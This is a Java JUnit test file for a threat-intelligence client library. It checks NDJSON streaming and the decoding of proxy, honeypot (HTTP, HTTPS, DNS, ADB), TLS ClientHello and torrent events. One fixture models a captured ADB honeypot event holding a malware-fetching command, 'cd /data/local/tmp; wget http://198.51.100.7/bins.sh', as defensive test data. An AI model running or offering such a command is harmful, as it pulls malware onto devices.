package com.synthient;

import static java.nio.charset.StandardCharsets.UTF_8;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.synthient.model.HeliosAdbEvent;
import com.synthient.model.HeliosDnsEvent;
import com.synthient.model.HeliosHttpEvent;
import com.synthient.model.HeliosHttpsEvent;
import com.synthient.model.HeliosTransport;
import com.synthient.model.ProxyEvent;
import com.synthient.model.TlsClientHello;
import com.synthient.model.TorrentEvent;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;
import java.util.NoSuchElementException;
import java.util.concurrent.atomic.AtomicInteger;
import org.junit.jupiter.api.Test;

class EventStreamTest {
    private static InputStream chunked(String text, int chunk) {
        return new ByteArrayInputStream(text.getBytes(UTF_8)) {
            @Override
            public synchronized int read(byte[] bytes, int offset, int length) {
                return super.read(bytes, offset, Math.min(length, chunk));
            }
        };
    }

    private static <T> List<T> readAll(InputStream in, Class<T> type) {
        List<T> events = new ArrayList<>();
        try (EventStream<T> stream = new EventStream<>(in, type)) {
            stream.forEach(events::add);
        }
        return events;
    }

    @Test
    void readsLinesSplitAtEveryOffset() {
        String payload =
                "{\"ip\":\"10.0.0.1\",\"provider\":\"prøxy\"}\r\n\n  \t\r\n{\"ip\":\"10.0.0.2\"}\n\n{\"ip\":\"10.0.0.3\"}";
        int length = payload.getBytes(UTF_8).length;
        for (int chunk = 1; chunk <= length; chunk++) {
            List<ProxyEvent> events = readAll(chunked(payload, chunk), ProxyEvent.class);
            assertEquals(
                    List.of("10.0.0.1", "10.0.0.2", "10.0.0.3"),
                    events.stream().map(ProxyEvent::ip).toList(),
                    "chunk " + chunk);
            assertEquals("prøxy", events.getFirst().provider());
        }
    }

    @Test
    void failsOnATruncatedLineAfterEarlierEvents() {
        Iterator<ProxyEvent> events =
                new EventStream<>(chunked("{\"ip\":\"10.0.0.1\"}\n{\"ip\":", 3), ProxyEvent.class).iterator();
        assertEquals("10.0.0.1", events.next().ip());
        assertThrows(SynthientException.class, events::hasNext);
    }

    @Test
    void failsOnInvalidJson() {
        assertThrows(SynthientException.class, () -> readAll(chunked("not json\n", 64), ProxyEvent.class));
        assertThrows(SynthientException.class, () -> readAll(chunked("{\"asn\":\"x\"}\n", 64), ProxyEvent.class));
    }

    @Test
    void failsOnAnOversizedLine() {
        InputStream endless = new InputStream() {
            @Override
            public int read() {
                return 'a';
            }

            @Override
            public int read(byte[] bytes, int offset, int length) {
                Arrays.fill(bytes, offset, offset + length, (byte) 'a');
                return length;
            }
        };
        SynthientException error = assertThrows(SynthientException.class, () -> readAll(endless, ProxyEvent.class));
        assertEquals("stream event exceeds 16777216 bytes", error.getMessage());
    }

    @Test
    void iteratesOnce() {
        EventStream<ProxyEvent> stream = new EventStream<>(chunked("", 1), ProxyEvent.class);
        assertFalse(stream.iterator().hasNext());
        assertThrows(IllegalStateException.class, stream::iterator);
    }

    @Test
    void closingDiscardsAPrefetchedEvent() {
        EventStream<ProxyEvent> stream = new EventStream<>(chunked("{\"ip\":\"10.0.0.1\"}\n", 64), ProxyEvent.class);
        Iterator<ProxyEvent> events = stream.iterator();
        assertTrue(events.hasNext());
        stream.close();
        assertFalse(events.hasNext());
        assertThrows(NoSuchElementException.class, events::next);
    }

    @Test
    void decodesHeliosEvents() {
        String raw = Base64.getEncoder().encodeToString("GET / HTTP/1.1\r\n".getBytes(UTF_8));
        String meta = "\"meta\":{\"proxy_ip\":\"198.51.100.4\",\"provider\":\"acme\"}";
        HeliosHttpEvent http = readAll(
                        chunked(
                                "{\"timestamp\":1780000000123,\"tunnel_id\":9007199254740993,\"domain\":\"a.test\","
                                        + "\"port\":80,\"protocol\":\"http\"," + meta + ",\"raw\":\"" + raw + "\","
                                        + "\"details\":{\"method\":\"GET\",\"uri\":\"/\",\"headers\":{\"Host\":\"a.test\"}}}\n",
                                64),
                        HeliosHttpEvent.class)
                .getFirst();
        assertEquals(Instant.ofEpochMilli(1780000000123L), http.timestamp());
        assertEquals(new BigInteger("9007199254740993"), http.tunnelId());
        assertEquals("GET / HTTP/1.1\r\n", new String(Base64.getDecoder().decode(http.raw()), UTF_8));
        assertNotNull(http.details());
        assertEquals("a.test", http.details().headers().get("Host"));

        HeliosHttpsEvent https = readAll(
                        chunked(
                                "{\"timestamp\":1780000000123,\"tunnel_id\":17257744507466107949,\"domain\":\"a.test\",\"port\":443,"
                                        + "\"protocol\":\"https\"," + meta + ",\"details\":null,\"raw\":null,"
                                        + "\"transport\":\"tcp\"}\n",
                                64),
                        HeliosHttpsEvent.class)
                .getFirst();
        assertEquals(new BigInteger("17257744507466107949"), https.tunnelId());
        assertNull(https.details());
        assertEquals(HeliosTransport.TCP, https.transport());

        HeliosDnsEvent dns = readAll(
                        chunked(
                                "{\"timestamp\":1780000000123,\"tunnel_id\":18446744073709551615,\"domain\":\"a.test\",\"port\":53,"
                                        + "\"protocol\":\"dns\"," + meta + ",\"transport\":\"udp\"}\n",
                                64),
                        HeliosDnsEvent.class)
                .getFirst();
        assertEquals(new BigInteger("18446744073709551615"), dns.tunnelId());
        assertEquals("198.51.100.4", dns.meta().proxyIp());
        assertEquals(HeliosTransport.UDP, dns.transport());

        assertThrows(
                SynthientException.class,
                () -> readAll(chunked("{\"session\":\"s\",\"command\":\"ls\"}\n", 64), HeliosAdbEvent.class));
    }

    private static final String HTTPS_EVENT = """
            {"timestamp": 1714780800123, "tunnel_id": 17257744507466107949, "domain": "example.com", "port": 443,
             "protocol": "https", "meta": {"proxy_ip": "203.0.113.10", "server": "hp-eu-1", "pool_id": "prod",
             "provider": "luminati"}, "transport": "%s", "details": %s}
            """;

    @Test
    void decodesEveryClientHelloField() {
        String details = """
                {"record_version": "TLS 1.0", "record_version_code": 769, "handshake_version": "TLS 1.2",
                 "handshake_version_code": 771, "supported_version_codes": [2570, 772, 771],
                 "alpn_hex": ["6832", "687474702f312e31"],
                 "signature_algorithms_cert": [{"code": 2052, "name": "rsa_pss_rsae_sha256"}],
                 "record_size_limit": 16385, "max_fragment_length": 2, "complete": false, "truncated": true,
                 "transport": "tcp"}
                """;
        HeliosHttpsEvent event =
                Json.decode(HTTPS_EVENT.formatted("tcp", details).getBytes(UTF_8), HeliosHttpsEvent.class);
        TlsClientHello hello = event.details();
        assertNotNull(hello);
        assertEquals(769, hello.recordVersionCode());
        assertEquals(771, hello.handshakeVersionCode());
        assertEquals(List.of(0x0a0a, 772, 771), hello.supportedVersionCodes());
        assertEquals(List.of("6832", "687474702f312e31"), hello.alpnHex());
        assertNotNull(hello.signatureAlgorithmsCert());
        assertEquals(
                "rsa_pss_rsae_sha256",
                hello.signatureAlgorithmsCert().getFirst().name());
        assertEquals(16385, hello.recordSizeLimit());
        assertEquals(2, hello.maxFragmentLength());
        assertEquals(false, hello.complete());
        assertEquals(true, hello.truncated());
        assertEquals(HeliosTransport.TCP, hello.transport());

        TlsClientHello empty = Json.decode(HTTPS_EVENT.formatted("tcp", "{}").getBytes(UTF_8), HeliosHttpsEvent.class)
                .details();
        assertNotNull(empty);
        assertNull(empty.complete());
        assertNull(empty.truncated());
        assertNull(empty.transport());
        assertNull(empty.recordVersionCode());
        assertNull(empty.handshakeVersionCode());
        assertNull(empty.supportedVersionCodes());
        assertNull(empty.alpnHex());
        assertNull(empty.signatureAlgorithmsCert());
        assertNull(empty.recordSizeLimit());
        assertNull(empty.maxFragmentLength());
    }

    @Test
    void keepsUnknownTransports() {
        HeliosHttpsEvent https =
                Json.decode(HTTPS_EVENT.formatted("sctp", "null").getBytes(UTF_8), HeliosHttpsEvent.class);
        assertEquals("sctp", https.transport());
        String withoutTransport = HTTPS_EVENT.formatted("tcp", "null").replace("\"transport\": \"tcp\", ", "");
        assertThrows(
                SynthientException.class, () -> Json.decode(withoutTransport.getBytes(UTF_8), HeliosHttpsEvent.class));
        assertThrows(
                SynthientException.class, () -> Json.decode(withoutTransport.getBytes(UTF_8), HeliosDnsEvent.class));
    }

    @Test
    void decodesAdbEventsWithAndWithoutMeta() {
        String event = """
                {"session": "00075b3dde7ddb645347a137f01ac991", "sequential_id": 3,
                 "command": "cd /data/local/tmp; wget http://198.51.100.7/bins.sh", "hash": "cd6d", "meta": %s}
                """;
        HeliosAdbEvent withMeta = Json.decode(
                event.formatted("{\"proxy_ip\": \"203.0.113.10\", \"server\": \"hp-eu-1\", \"pool_id\": \"prod\","
                                + " \"provider\": \"luminati\"}")
                        .getBytes(UTF_8),
                HeliosAdbEvent.class);
        assertNotNull(withMeta.meta());
        assertEquals("luminati", withMeta.meta().provider());
        assertEquals(3, withMeta.sequentialId());

        HeliosAdbEvent withoutMeta = Json.decode(event.formatted("null").getBytes(UTF_8), HeliosAdbEvent.class);
        assertNull(withoutMeta.meta());
    }

    @Test
    void decodesTorrentEvents() {
        TorrentEvent torrent = readAll(
                        chunked(
                                "{\"info_hash\":\"ab\",\"timestamp\":1780000000,\"files\":[{\"path\":\"a\",\"length\":3}],"
                                        + "\"peers\":[{\"ip\":\"10.0.0.1\",\"port\":6881,\"encrypted\":true,\"source\":\"DHT\"}]}\n",
                                64),
                        TorrentEvent.class)
                .getFirst();
        assertEquals(Instant.ofEpochSecond(1780000000), torrent.timestamp());
        assertNotNull(torrent.peers());
        assertEquals(true, torrent.peers().getFirst().encrypted());
        assertNull(torrent.name());
    }

    @Test
    void streamsOverHttp() throws Exception {
        try (TestServer server = new TestServer(exchange -> TestServer.respond(
                        exchange, 200, "application/x-ndjson", "{\"ip\":\"10.0.0.1\"}\n\n{\"ip\":\"10.0.0.2\"}\n"));
                SynthientClient client = server.client();
                EventStream<ProxyEvent> events = client.proxies().stream()) {
            assertEquals(List.of("10.0.0.1", "10.0.0.2"), readIps(events));
            TestServer.Request request = server.requests.getFirst();
            assertEquals("/api/v4/feeds/proxies/stream", request.path());
            assertEquals("application/x-ndjson", request.header("Accept"));
        }
    }

    @Test
    void retriesTheConnection() throws Exception {
        AtomicInteger calls = new AtomicInteger();
        try (TestServer server = new TestServer(exchange -> {
                    if (calls.getAndIncrement() == 0) {
                        TestServer.json(exchange, 503, "{}");
                    } else {
                        TestServer.respond(exchange, 200, "application/x-ndjson", "{\"ip\":\"10.0.0.1\"}\n");
                    }
                });
                SynthientClient client = server.client();
                EventStream<ProxyEvent> events = client.proxies().stream()) {
            assertEquals(List.of("10.0.0.1"), readIps(events));
            assertEquals(2, server.requests.size());
        }
    }

    @Test
    void refusedConnectionsThrow() throws Exception {
        try (TestServer server = new TestServer(exchange -> TestServer.json(exchange, 403, "{\"detail\":\"no\"}"));
                SynthientClient client = server.client()) {
            assertEquals(
                    403,
                    assertThrows(ApiException.class, client.proxies()::stream).statusCode());
        }
        try (TestServer server = new TestServer(exchange -> TestServer.json(exchange, 429, "{}"));
                SynthientClient client = server.client()) {
            ApiException error = assertThrows(ApiException.class, client.proxies()::stream);
            assertNull(error.retryAfter());
            assertEquals(1, server.requests.size());
        }
    }

    @Test
    void closingReleasesTheConnection() throws Exception {
        try (TestServer server = new TestServer(exchange -> {
                    if (exchange.getRequestURI().getPath().endsWith("/stream")) {
                        exchange.sendResponseHeaders(200, 0);
                        OutputStream out = exchange.getResponseBody();
                        try {
                            for (int i = 0; i < 10_000; i++) {
                                out.write("{\"ip\":\"10.0.0.1\"}\n".getBytes(UTF_8));
                                out.flush();
                                Thread.sleep(5);
                            }
                        } catch (IOException | InterruptedException e) {
                            return;
                        }
                    }
                    TestServer.json(exchange, 200, "{\"ip\":\"10.0.0.9\"}");
                });
                SynthientClient client = server.client()) {
            EventStream<ProxyEvent> events = client.proxies().stream();
            assertTrue(events.iterator().hasNext());
            events.close();
            assertEquals("10.0.0.9", client.lookupIp("10.0.0.9").ip());
        }
    }

    private static List<String> readIps(EventStream<ProxyEvent> events) {
        List<String> ips = new ArrayList<>();
        for (ProxyEvent event : events) {
            ips.add(event.ip());
        }
        return ips;
    }
}
